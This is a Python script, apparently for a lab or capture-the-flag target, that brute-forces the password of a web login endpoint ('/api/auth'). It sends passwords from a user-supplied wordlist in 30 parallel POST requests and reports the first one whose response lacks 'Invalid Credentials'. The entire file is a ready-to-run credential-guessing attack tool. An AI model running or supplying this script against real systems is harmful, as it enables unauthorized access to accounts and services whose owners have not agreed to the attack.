import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# Get target URL and wordlist path from user input
target = input("Enter the target (e.g., http://IP:PORT/): ").strip()
if not target.endswith("/"):
    target += "/"
url = f'{target}api/auth'

wordlist_path = input("Enter the wordlist file path: ").strip()

# Flag to stop once a valid password is found
found = False

# Attempt login with a password
def try_password(password):
    global found
    if found:
        return None
    password = password.strip()
    try:
        response = requests.post(url, data={'password': password}, timeout=5)
        if "Invalid Credentials" not in response.text:
            found = True
            return password
    except requests.RequestException as e:
        print(f"Request error with password '{password}': {e}")
    return None

# Main function to load wordlist and run the brute-force
def main():
    try:
        with open(wordlist_path, 'r', encoding='latin-1') as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"[!] File not found: {wordlist_path}")
        return
    except Exception as e:
        print(f"[!] Error opening file: {e}")
        return

    print(f"[+] Starting brute-force on {url} with {len(passwords)} passwords...")

    with ThreadPoolExecutor(max_workers=30) as executor:  # adjust worker count if needed
        futures = {executor.submit(try_password, pw): pw for pw in passwords}
        for future in as_completed(futures):
            result = future.result()
            if result:
                print(f"\n[✅] Valid password found: {result}")
                break
        else:
            print("\n[❌] No valid password found.")

if __name__ == "__main__":
    main()
